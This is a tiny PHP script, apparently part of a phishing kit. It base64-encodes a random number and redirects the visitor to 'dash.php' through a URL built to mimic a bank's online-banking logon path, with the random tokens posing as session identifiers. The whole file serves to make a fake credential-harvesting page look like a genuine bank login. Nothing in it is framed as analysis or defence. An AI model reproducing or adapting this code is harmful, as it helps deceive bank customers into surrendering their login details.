<?php
	
	$praga=rand();
	$praga=base64_encode($praga);

	header ("location: dash.php?public/enroll/IdentifyUser-aspx-LOB=RBGLogon=$praga$praga&session=$praga$praga");


?>